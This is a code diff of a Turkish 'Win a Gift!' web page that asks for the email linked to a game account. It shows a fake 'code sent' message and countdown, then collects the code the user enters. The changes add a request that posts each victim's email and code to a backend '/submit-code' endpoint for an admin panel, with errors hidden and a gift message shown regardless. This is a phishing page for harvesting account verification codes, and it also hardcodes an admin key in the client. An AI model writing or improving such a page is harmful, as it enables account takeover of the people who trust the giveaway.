@@ -43,21 +43,23 @@
       cursor: pointer;
     }
     button:hover { background: #2563eb; }
-    .msg { margin-top: 16px; text-align: center; }
-    .timer { margin-top: 12px; text-align: center; font-weight: bold; }
+    .msg { margin-top: 12px; text-align: center; }
+    .timer { margin-top: 8px; text-align: center; font-weight: bold; }
   </style>
 </head>
 <body>
   <div class="card">
     <h1>Hediye Kazan!</h1>
+
     <label for="email">Oyun hesabına bağlı e‑posta adresini gir:</label>
     <input id="email" type="email" placeholder="ornek@mail.com" />
+
     <button id="sendBtn">Kodu Gönder</button>
     <div id="msg" class="msg"></div>
     <div id="timer" class="timer"></div>
 
     <!-- Kod girme alanı başlangıçta gizli -->
-    <div id="codeSection" style="display:none; margin-top:20px;">
+    <div id="codeSection" style="display:none; margin-top:16px;">
       <label for="codeInput">Gönderilen kodu gir:</label>
       <input id="codeInput" type="text" placeholder="Kodunuzu yazın" />
       <button id="checkBtn">Doğrula</button>
@@ -66,61 +68,75 @@
   </div>
 
   <script>
-    const btn = document.getElementById('sendBtn');
-    const msg = document.getElementById('msg');
-    const timerDiv = document.getElementById('timer');
-    const codeSection = document.getElementById('codeSection');
-    const checkBtn = document.getElementById('checkBtn');
-    const codeMsg = document.getElementById('codeMsg');
+    const sendBtn   = document.getElementById('sendBtn');
+    const msg       = document.getElementById('msg');
+    const timerDiv  = document.getElementById('timer');
+    const codeSec   = document.getElementById('codeSection');
+    const checkBtn  = document.getElementById('checkBtn');
+    const codeMsg   = document.getElementById('codeMsg');
 
-    btn.addEventListener('click', () => {
+    // "Kodu Gönder" → sahte bildirim + geri sayım + kod alanını aç
+    sendBtn.addEventListener('click', () => {
       const email = document.getElementById('email').value.trim();
       if (!email) {
         msg.textContent = "Lütfen e‑posta gir.";
+        msg.style.color = "red";
         return;
       }
-
-      // Gösterimlik mesaj
-      msg.textContent = "Kod e‑posta adresine gönderildi (sadece gösterimlik).";
-
-      // Kod alanını göster
-      codeSection.style.display = "block";
+      msg.textContent = "Kod e‑posta adresine gönderildi (gösterimlik).";
+      msg.style.color = "inherit";
+      codeSec.style.display = "block";
 
       // 3 dakikalık geri sayım
       let timeLeft = 180; // saniye
       const interval = setInterval(() => {
         const minutes = Math.floor(timeLeft / 60);
         const seconds = timeLeft % 60;
-        timerDiv.textContent = `Kodu girmeniz için kalan süre: ${minutes}:${seconds < 10 ? '0'+seconds : seconds}`;
+        timerDiv.textContent = `Kalan süre: ${minutes}:${seconds < 10 ? '0'+seconds : seconds}`;
         timeLeft--;
-
         if (timeLeft < 0) {
           clearInterval(interval);
           timerDiv.textContent = "Süre doldu!";
-          codeSection.style.display = "none"; // süre dolunca kod alanını gizle
+          codeSec.style.display = "none";
         }
       }, 1000);
     });
 
-    // Kod doğrulama
-   <!-- Kod doğrulama -->
-checkBtn.addEventListener('click', () => {
-  const enteredCode = document.getElementById('codeInput').value.trim();
+    // "Doğrula" → kodu kaydet + mesaj göster
+    checkBtn.addEventListener('click', async () => {
+      const email = document.getElementById('email').value.trim();
+      const code  = document.getElementById('codeInput').value.trim();
 
-  if (enteredCode === "benim-gizli-anahtarim") {
-    codeMsg.textContent = "Kod doğru! Hediyen tanımlandı 🎁";
-    codeMsg.style.color = "green";
-  } else {
-    codeMsg.textContent = "Kod hatalı! Yine de yönlendiriliyorsunuz...";
-    codeMsg.style.color = "red";
-  }
+      if (!email || !code) {
+        codeMsg.textContent = "E‑posta ve kod zorunlu.";
+        codeMsg.style.color = "red";
+        return;
+      }
 
-  // Her durumda admin paneline yönlendir
-  setTimeout(() => {
-    window.location.href = "/admin?key=benim-gizli-anahtarim";
-  }, 1500); // 1.5 saniye sonra yönlendirme
-});
+      // Admin panelin görebilsin diye backend'e kaydet
+      try {
+        await fetch('/submit-code', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, code })
+        });
+      } catch (e) {
+        // Kaydetme hatası olursa bile kullanıcıya devam mesajı ver
+      }
 
+      // Doğru/yanlış mesajı (gösterimlik)
+      if (code === "benim-gizli-anahtarim") {
+        codeMsg.textContent = "Kod doğru! Hediyen tanımlandı 🎁";
+        codeMsg.style.color = "green";
+      } else {
+        codeMsg.textContent = "Kod hatalı!";
+        codeMsg.style.color = "red";
+      }
+
+      // İsteğe bağlı yönlendirme: İstersen burada admin'e gitme yerine sayfada kalabilirsin.
+      // Yönlendirmek istersen şu satırı aç:
+      // window.location.href = "/admin?key=benim-gizli-anahtarim";
+    });
   </script>
 </body>
 </html>
